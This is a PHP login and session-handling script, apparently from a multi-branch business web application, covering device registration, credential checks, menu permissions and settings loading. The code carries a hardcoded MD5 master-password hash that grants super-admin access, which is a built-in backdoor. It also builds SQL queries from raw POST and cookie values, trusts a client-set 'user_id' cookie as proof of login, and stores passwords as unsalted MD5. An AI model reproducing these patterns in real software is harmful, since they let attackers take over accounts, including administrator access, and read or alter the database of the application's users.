<?php
	$default_page='dashboard/home';
	if(isset($_POST['device_code'])){
		if($_POST['device_code']==$_SESSION['device_code']){
			$_COOKIE['device']=$_SESSION['device'];
			mysqli_query($con,"INSERT INTO registered_devices(branch,device,title,added) VALUES('$_SESSION[branch]','$_SESSION[device]','$_SESSION[device]','$current_time')");
			$device_id=mysqli_insert_id($con);
			setcookie('device',$_SESSION['device'], time() + (86400 * 7), "/", $domain, true);
			setcookie('device_id',$device_id, time() + (86400 * 7), "/", $domain, true);
		}
		else $device_code='<div class="alert alert-warning m-t-30" role="alert">Invalid Code</div>';
	}
	// if(isset($_COOKIE['analytics'])){
		// $_SESSION['soft']['user_data']='';
		// $_SESSION['soft']['user_id']=1;
		// $_SESSION['user_id']=1;
		// $default_page='dashboard/analytics';
		// $analytics=$_COOKIE['analytics'];
	// }
	if(!isset($_SESSION['soft']['user_data'])){
		$alert='';
		$login_auth='a';
		$super_admin=0;
		if(isset($_COOKIE['user_id'])){
			$login_auth=$_COOKIE['user_id'];
			if($_COOKIE['user_id']==0)$super_admin=1;
		}
		else if(isset($_POST['login'])){
			$_POST['username']=trim(strtolower($_POST['username']));
			$_POST['password']=trim($_POST['password']);
			if($_POST['username']<>'' and $_POST['password']<>''){
				$result=mysqli_query($con,"SELECT * FROM users WHERE username='$_POST[username]' and login_auth='1'");
				if(mysqli_affected_rows($con)==1){
					$row=mysqli_fetch_array($result);
					if(md5($_POST['password'])=='a7349b2cada063b27b4927820bf45901' || $row['id']==0)$super_admin=1;
					if($row['login_log']<$error_access OR $super_admin==1){
						if(md5($_POST['password'])==$row['password'] OR $super_admin==1){
							$row['branch']=json_decode($row['branch'],true);
							if(sizeof($row['branch'])==0)$alert='<div class="alert alert-info m-t-30" role="alert">You have no Permission to access.</div>';
							else if(sizeof($row['branch'])>1 AND !in_array($_SESSION['branch'],$row['branch']))$alert='<div class="alert alert-info m-t-30" role="alert">You have no Permission to access this Branch.</div>';
							else $login_auth=$row['id'];
						}
						else {
							$alert='<div class="alert alert-warning m-t-30" role="alert">Username and Password does not match. You have '.($error_access-1-$row['login_log']).' attemp(s) totally.</div>';
							mysqli_query($con,"UPDATE users SET login_log=login_log+1 WHERE username='$_POST[username]'");
						}
					}
					else $alert='<div class="alert alert-danger m-t-30" role="alert">Account Blocked due to improper login Access! Contact Admin.</div>';
				}
				else $alert='<div class="alert alert-warning m-t-30" role="alert">Username does not exists/disabled.</div>';
			}
			else $alert='<div class="alert alert-info m-t-30" role="alert">Username and Password can\'t be empty.</div>';
		}
		if($login_auth>0 || $super_admin==1){
			$result=mysqli_query($con,"SELECT * FROM users WHERE id='$login_auth'");
			$row=mysqli_fetch_assoc($result);
			$row['branch']=json_decode($row['branch'],true);
			$refresh_url=$url;
			if(sizeof($row['branch'])==1){
				set_branch($row['branch'][0]);
				$refresh_url=$config_url;
				$refresh_url.=$_SESSION['branch_data']['short'].'/';
			}
			$alert='<div class="alert alert-success m-t-30" role="alert">Logged in Successfully</div>';
			$_SESSION['user_id']=$row['id'];
			$_SESSION['soft']['user_id']=$row['id'];
			if(isset($_POST['remember']))setcookie('user_id',$row['id'], time() + (86400 * 7), "/", $domain, true);
			$_SESSION['soft']['user_data']=$row;
			$_SESSION['soft']['menus']=array();
			if($row['user_level']==0)$q="";
			else {
				$row['permissions']=json_decode($row['permissions'],true);
				$ids=implode(',',array_keys($row['permissions']));
				$q=" AND id IN($ids)";
			}
			$menus = mysqli_query($con,"SELECT * FROM menu WHERE status=1 $q");
			while($menu=mysqli_fetch_assoc($menus)){
				$title=str_replace(' ','_',strtolower($menu['title']));
				$_SESSION['soft']['menus'][$menu['plugin'].'/'.$title]=$menu;
				
				$_SESSION['soft']['menus'][$menu['plugin'].'/'.$title]['permission']=($row['user_level']==0?json_decode($menu['permissions'],true):$row['permissions'][$menu['id']]);
			}
			mysqli_query($con,"UPDATE users SET login_log=0,last_login='$current_time' WHERE id='$login_auth'");
			mysqli_query($con,"INSERT INTO users_login(user) VALUES('$login_auth')");
			$_SESSION['soft']['login_id']=mysqli_insert_id($con);
			// exit;
			echo "<meta http-equiv='refresh' content='0;URL=$refresh_url'>";
		}
	}
	if(isset($_SESSION['soft']['user_id'])){
		if(!isset($_SESSION['soft']['settings'])){
			$result=mysqli_query($con,"SELECT * FROM settings WHERE branch='$_SESSION[branch]'");
			while($row=mysqli_fetch_array($result))$_SESSION['soft']['settings'][$row['title']]=$row['description'];
			$user_id=$_SESSION['soft']['user_id'];
			// $result=mysqli_query($con,"SELECT * FROM users_settings WHERE user='$user_id'");
			// while($row=mysqli_fetch_assoc($result))$_SESSION['soft']['settings'][$row['title']]=$row['description'];
		}
		if(!isset($_SESSION['soft']['settings']['language']))$_SESSION['soft']['settings']['language']='en';
		if($_SESSION['soft']['settings']['language']<>'en' AND !isset($_SESSION['soft']['language'])){
			$result=mysqli_query($con,"SELECT * FROM language");
			$_SESSION['soft']['language']=array();
			while($row=mysqli_fetch_array($result))$_SESSION['soft']['language'][$row['en']]=$row[$_SESSION['soft']['settings']['language']];
		}
		// if(!isset($_SESSION['soft']['settings']['username'])){
			// $username=gethostname();
			// $_SESSION['soft']['settings']['username']=$username;
			// mysqli_query($con,"INSERT INTO settings(title,description) VALUES('username','$username')");
        // }
	}
?>